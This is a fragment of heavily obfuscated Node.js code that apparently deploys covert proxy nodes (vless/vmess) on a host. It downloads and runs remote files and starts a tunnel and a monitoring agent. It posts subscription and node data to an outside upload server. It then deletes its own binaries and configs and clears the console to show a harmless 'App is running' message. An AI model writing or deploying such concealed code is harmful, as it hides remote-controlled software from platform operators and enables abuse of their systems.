_0x1a6637={_0x2b8451:0xeb,_0x15c886:0x113,_0x32ccbd:0x14d,_0x17dbc3:0x133,_0x3b43f1:0xc5,_0x10dba1:0xb3,_0x1b2a30:0x9f,_0x51a6c4:0xb3,_0x5acc2b:0xcb,_0x78e1:0x140,_0x2ab30d:0xe3},_0x1525e8=await _0x16f91d(),_0x297085=NAME?NAME+'-'+_0x1525e8:_0x1525e8;return new Promise(_0x4cd7de=>{const _0x377972={_0x5519bf:0x10e,_0x4d951a:0xb3};setTimeout(()=>{const _0x439bca=_0x3ba5,_0x4054a4={'v':'2','ps':''+_0x297085,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x439bca(_0x1a6637._0x2b8451),'net':'ws','type':_0x439bca(0xeb),'host':_0x20f376,'path':_0x439bca(_0x1a6637._0x15c886),'tls':'tls','sni':_0x20f376,'alpn':'','fp':_0x439bca(_0x1a6637._0x32ccbd)},_0x3aac7b='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+_0x439bca(0x150)+_0x20f376+_0x439bca(_0x1a6637._0x17dbc3)+_0x20f376+_0x439bca(0xd5)+_0x297085+_0x439bca(0xcd)+Buffer[_0x439bca(0x10e)](JSON['stringify'](_0x4054a4))[_0x439bca(0xb3)]('base64')+_0x439bca(_0x1a6637._0x3b43f1)+UUID+'@'+CFIP+':'+CFPORT+_0x439bca(0x9a)+_0x20f376+_0x439bca(0x133)+_0x20f376+_0x439bca(0x121)+_0x297085+'\x0a\x20\x20\x20\x20';console[_0x439bca(0xcb)](Buffer['from'](_0x3aac7b)[_0x439bca(_0x1a6637._0x10dba1)](_0x439bca(0xe5))),fs[_0x439bca(_0x1a6637._0x1b2a30)](subPath,Buffer[_0x439bca(0x10e)](_0x3aac7b)[_0x439bca(_0x1a6637._0x51a6c4)]('base64')),console[_0x439bca(_0x1a6637._0x5acc2b)](FILE_PATH+_0x439bca(_0x1a6637._0x78e1)),uploadNodes(),app[_0x439bca(_0x1a6637._0x2ab30d)]('/'+SUB_PATH,(_0x5b998a,_0x8aecdb)=>{const _0x562a6d=_0x439bca,_0x3faca0=Buffer[_0x562a6d(_0x377972._0x5519bf)](_0x3aac7b)[_0x562a6d(_0x377972._0x4d951a)](_0x562a6d(0xe5));_0x8aecdb[_0x562a6d(0xa6)](_0x562a6d(0xc2),'text/plain;\x20charset=utf-8'),_0x8aecdb[_0x562a6d(0x149)](_0x3faca0);}),_0x4cd7de(_0x3aac7b);},0x7d0);});}}async function uploadNodes(){const _0x4f06ed={_0x441b86:0x10c,_0x276630:0xcb,_0x422a7f:0x12c,_0x1e2f0e:0xe9,_0x75dc49:0x10f,_0x5a6dda:0xc1,_0x6c787c:0x10c,_0x44f3ef:0x13b},_0x1f55a6=_0x10497d;if(UPLOAD_URL&&PROJECT_URL){const _0x5c03b1=PROJECT_URL+'/'+SUB_PATH,_0x11718d={'subscription':[_0x5c03b1]};try{const _0x5b69e2=await axios['post'](UPLOAD_URL+'/api/add-subscriptions',_0x11718d,{'headers':{'Content-Type':'application/json'}});return _0x5b69e2&&_0x5b69e2[_0x1f55a6(_0x4f06ed._0x441b86)]===0xc8?(console[_0x1f55a6(_0x4f06ed._0x276630)](_0x1f55a6(0x101)),_0x5b69e2):null;}catch(_0x1c03fe){if(_0x1c03fe['response']){if(_0x1c03fe['response'][_0x1f55a6(0x10c)]===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x1f55a6(_0x4f06ed._0x422a7f)](listPath))return;const _0x567f19=fs[_0x1f55a6(_0x4f06ed._0x1e2f0e)](listPath,_0x1f55a6(0xf5)),_0x232f0c=_0x567f19['split']('\x0a')['filter'](_0x160af7=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x1f55a6(0xec)](_0x160af7));if(_0x232f0c[_0x1f55a6(_0x4f06ed._0x75dc49)]===0x0)return;const _0x59a158=JSON[_0x1f55a6(_0x4f06ed._0x5a6dda)]({'nodes':_0x232f0c});try{const _0x2adf7a=await axios[_0x1f55a6(0xf6)](UPLOAD_URL+'/api/add-nodes',_0x59a158,{'headers':{'Content-Type':_0x1f55a6(0x12d)}});return _0x2adf7a&&_0x2adf7a[_0x1f55a6(_0x4f06ed._0x6c787c)]===0xc8?(console[_0x1f55a6(0xcb)](_0x1f55a6(_0x4f06ed._0x44f3ef)),_0x2adf7a):null;}catch(_0x9a2ce6){return null;}}else return;}}function cleanFiles(){const _0x250a54={_0x5842aa:0xf8,_0x2aa951:0x107,_0x34be53:0xf1,_0x4d8600:0x13a},_0x28771a={_0x5f5945:0x11f,_0x3f5339:0xcb};setTimeout(()=>{const _0x1ab63c=_0x3ba5,_0x1c3ba3=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x1c3ba3['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x1c3ba3[_0x1ab63c(0x9c)](phpPath);process[_0x1ab63c(_0x250a54._0x5842aa)]===_0x1ab63c(_0x250a54._0x2aa951)?exec(_0x1ab63c(_0x250a54._0x34be53)+_0x1c3ba3[_0x1ab63c(0xe4)]('\x20')+'\x20>\x20nul\x202>&1',_0x1baf4d=>{const _0x17cb08=_0x1ab63c;console['clear'](),console[_0x17cb08(0xcb)]('App\x20is\x20running'),console[_0x17cb08(0xcb)](_0x17cb08(0x91));}):exec(_0x1ab63c(0xc8)+_0x1c3ba3['join']('\x20')+_0x1ab63c(_0x250a54._0x4d8600),_0x236007=>{const _0x21da6d=_0x1ab63c;console[_0x21da6d(_0x28771a._0x5f5945)](),console[_0x21da6d(_0x28771a._0x3f5339)](_0x21da6d(0x11d)),console[_0x21da6d(0xcb)](_0x21da6d(0x91));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x3fc4af={_0x492f7d:0xf6,_0x5b7782:0x108,_0x9089f4:0xba,_0x281d4a:0xb4},_0x4c57d0=_0x10497d;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0x4c57d0(0x11b));return;}try{const _0x3e96db=await axios[_0x4c57d0(_0x3fc4af._0x492f7d)](_0x4c57d0(_0x3fc4af._0x5b7782),{'url':PROJECT_URL},{'headers':{'Content-Type':_0x4c57d0(0x12d)}});return console[_0x4c57d0(0xcb)](_0x4c57d0(0xce)),_0x3e96db;}catch(_0x3a3d65){return console[_0x4c57d0(_0x3fc4af._0x9089f4)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x3a3d65[_0x4c57d0(_0x3fc4af._0x281d4a)]),null;}}function _0x3ba5(_0x29a25e,_0x44993f){const _0x50f5cd=_0x50f5();return _0x3ba5=function(_0x3ba518,_0x331bbe){_0x3ba518=_0x3ba518-0x91;let _0x309909=_0x50f5cd[_0x3ba518];return _0x309909;},_0x3ba5(_0x29a25e,_0x44993f);}async function startserver(){const _0x157257=_0x10497d;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x33cc13){console[_0x157257(0xba)](_0x157257(0x117),_0x33cc13);}}startserver()[_0x10497d(0x142)](_0x211126=>{const _0x2c5aa9=_0x10497d;console[_0x2c5aa9(0xba)]('Unhandled\x20error\x20in\x20startserver:',_0x211126);}),app[_0x10497d(0xb5)](PORT,()=>console[_0x10497d(0xcb)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
